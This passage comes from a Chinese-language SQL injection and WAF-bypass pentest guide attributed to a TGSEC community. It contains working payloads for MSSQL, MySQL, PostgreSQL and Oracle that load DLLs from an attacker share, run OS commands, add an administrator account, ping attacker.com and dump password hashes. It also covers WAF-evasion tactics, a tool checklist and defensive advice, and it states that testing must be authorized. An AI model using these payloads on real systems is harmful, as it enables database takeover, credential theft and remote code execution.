'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'clr enabled',1;RECONFIGURE;--
'; CREATE ASSEMBLY [cmd] FROM '\\attacker\share\cmd.dll' WITH PERMISSION_SET=UNSAFE;--

-- MySQL UDF提权（需FILE权限+plugin目录可写）
'; SELECT load_file('\\attacker\share\udf.dll') INTO DUMPFILE 'C:/Program Files/MySQL/lib/plugin/udf.dll';--
'; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';SELECT sys_eval('whoami');--

-- PostgreSQL 命令执行
'; CREATE TABLE cmd(out text);COPY cmd FROM PROGRAM 'id';SELECT * FROM cmd;--
'; COPY (SELECT '') TO PROGRAM 'ping attacker.com'--

-- Oracle命令执行（需JAVA/DBA权限）
'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'CMD',job_type=>'EXECUTABLE',job_action=>'/bin/sh',number_of_arguments=>2,auto_drop=>FALSE);DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD',1,'-c');DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD',2,'id');DBMS_SCHEDULER.RUN_JOB('CMD');END;--
```

### 6.3 权限提升与横向
```sql
-- MSSQL 提权
'; EXEC sp_addsrvrolemember 'sa','sysadmin'--
'; EXEC master..xp_servicecontrol 'start','schedule'--
'; EXEC master..xp_cmdshell 'net user hacker P@ssw0rd /add && net localgroup administrators hacker /add'--

-- MySQL UDF→MOF提权（老版本）
'; SELECT load_file('\\attacker\mof.mof') INTO DUMPFILE 'c:/windows/system32/wbem/mof/nullevt.mof';--

-- 哈希dump
'; SELECT user,authentication_string FROM mysql.user--
'; SELECT name,master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins--
```

## 七、AI驱动的智能绕过策略

### 7.1 语义分析WAF对抗
- **自然语言函数包装**：针对AI驱动的WAF（如Cloudflare AI/雷池），使用`AI_SQL_GENERATE`/`VECTOR_DISTANCE`/`AI_PREDICT`等新兴AI函数（MSSQL 2025/Oracle 23ai），让WAF的语义模型将SQL识别为"合法AI查询"
- **业务逻辑伪装**：将注入Payload包装为合法业务查询结构，如`' AND (SELECT COUNT(*) FROM orders WHERE status='paid')>0 AND SLEEP(5)--`
- **查询行为模拟**：先发送多个合法查询"训练"WAF白名单，再注入

### 7.2 Payload动态生成策略
```
1. 指纹识别 → 确定数据库类型/版本/WAF类型
2. 基础Payload测试 → 判断拦截等级
3. 渐进式绕过：
   - 先试注释+大小写
   - 再试空白符替换+等价函数
   - 再试编码层+协议层
   - 最后分版本高级语法变形
4. 二分法定位关键字拦截 → 针对拦截词逐一替换
5. 拼接绕过（HPP/注释跨参数）
6. 外带通道替代（DNS/HTTP）
```

### 7.3 手动测试决策树
```
是否WAF拦截?
├─ 是 → 加/**/和随机大小写 → 过了吗?
│       ├─ 是 → 继续加深混淆
│       └─ 否 → 换空白符(%09/%0a)和等价函数 → 过了吗?
│                ├─ 是 → 继续
│                └─ 否 → URL编码/chunked/HPP → 过了吗?
│                         ├─ 是 → 继续
│                         └─ 否 → 外带通道(DNS/HTTP)或换注入点
└─ 否 → 正常提取数据
```

## 八、工具链与自动化

### 8.1 工具选型
| 工具 | 用途 |
|------|------|
| sqlmap | 自动化注入检测利用（首选）|
| Burp Suite | 手动测试/代理/Repeater |
| NoSQLMap | MongoDB/NoSQL注入 |
| SQLiPy (Burp插件) | Burp集成sqlmap |
| Hackvertor (Burp插件) | 编码标签化绕过 |
| Gopherus | Gopher协议SSRF→SQLi |
| tplmap | SSTI模板注入（非SQL但需联动）|
| NoSQLAttack | NoSQL注入 |

### 8.2 Burp插件辅助
- **Hackvertor**：使用`<@hex_entities>`、`<@urlencode>`、`<@unicoder>`标签动态编码
- **Burp Collaborator**：OOB外带数据接收（DNS/HTTP）
- **Active Scan++**：二阶注入/高级绕过
- **JSON Web Tokens**：JWT注入场景

### 8.3 自定义Tamper编写思路
1. 确定目标WAF拦截的关键字符/关键字
2. 编写字符级替换函数（空格/引号/关键字）
3. 添加版本探测逻辑，针对版本加载特定替换
4. 使用`__priority__ = PRIORITY.HIGHEST`确保优先级
5. 参考ByPassTamperPlus：按数据库版本定制、集成该版本独有函数做语法变形

## 九、SQL注入测试检查清单

### 9.1 注入点发现
- [ ] 所有HTTP参数测试（GET/POST/Header/Cookie/JSON/XML）
- [ ] 所有注入点类型验证（Union/Boolean/Time/Error/Stacked/Second-Order）
- [ ] 多参数组合测试（参数间逻辑关系）
- [ ] 二次注入测试（存储后触发）

### 9.2 数据库指纹
- [ ] 确定数据库类型（MySQL/MSSQL/Oracle/PostgreSQL/SQLite）
- [ ] 确定数据库版本
- [ ] 确定当前用户及权限
- [ ] 确定WAF类型（如有）

### 9.3 WAF绕过
- [ ] 编码绕过（URL/Unicode/Hex/Double URL）
- [ ] 空白字符绕过（空格/Tab/换行/注释）
- [ ] 关键字变形（大小写/内联注释/拆分）
- [ ] 语法绕过（数据库版本特有函数/语法）
- [ ] sqlmap Tamper组合测试
- [ ] AI语义级绕过（CTE/JSON函数/窗口函数）

### 9.4 数据提取与利用
- [ ] 数据库列表提取
- [ ] 表/列结构提取
- [ ] 敏感数据提取（用户/密码/密钥）
- [ ] 权限评估（DBA/FILE/命令执行）
- [ ] RCE路径验证（xp_cmdshell/INTO OUTFILE/UTL_FILE等）

### 9.5 外带通道
- [ ] DNS外带测试（DNSLog）
- [ ] HTTP外带测试
- [ ] SMB外带测试（Windows/MSSQL）

## 十、绕过验证与报告

### 10.1 验证步骤
1. **确认注入**：通过布尔差异/时间延迟/错误回显确认存在SQL注入
2. **确定指纹**：数据库类型/版本/权限/WAF类型
3. **提取数据**：使用最稳通道（回显→报错→布尔→时间→外带，优先级递减）
4. **权限评估**：当前用户权限、是否DBA、文件读写权限、命令执行权限
5. **影响范围**：数据库中敏感数据、是否可RCE、是否可内网横向
6. **证据留存**：完整的HTTP请求/响应、sqlmap日志、POC截图

### 10.2 报告要点
- 注入点URL/参数/方法
- 注入类型（Union/Boolean/Time/Error/Stacked/OOB）
- 数据库类型/版本/当前用户/权限
- 绕过WAF的具体方法（使用了哪些tamper/技术）
- 提取的敏感数据样例（脱敏）
- 可到达的影响（数据泄露/RCE/提权）
- 完整可复现POC
- 修复建议（参数化查询/ORM/输入验证/最小权限/WAF规则优化）

## 十一、防护建议参考
- **强制参数化查询**（PreparedStatement/PDO prepared）
- **使用ORM框架**（避免手写SQL拼接）
- **存储过程参数化**（非EXEC拼接）
- **最小权限原则**（应用账号非sa/root、禁用FILE/xp_cmdshell）
- **输入白名单验证**（类型/长度/格式）
- **统一错误处理**（关闭数据库详细错误回显）
- **WAF规则优化**（不仅仅正则，启用语义分析）
- **敏感数据加密存储**（哈希/加密）
- **secure_file_priv限制**（MySQL）
- **禁用多语句执行**（除非必要）

## 注意事项

- **仅限授权测试**：必须获得书面授权，并在约定范围和时间窗口内进行
- **数据安全**：测试时避免DROP/DELETE/UPDATE等破坏性操作，必要时使用事务回滚
- **频率控制**：使用`--delay`控制请求频率，避免触发IDS/IPS封禁或影响业务
- **日志清理意识**：测试后清理测试痕迹（WebShell、临时表、日志），但需提前与客户确认
- **合规要求**：遵守《网络安全法》《数据安全法》等法律法规
- **WAF绕过非100%**：受WAF版本、规则、部署架构影响，需要持续调整策略

---
@TGSEC社区 · @TGSEC-Qtzuu 整理
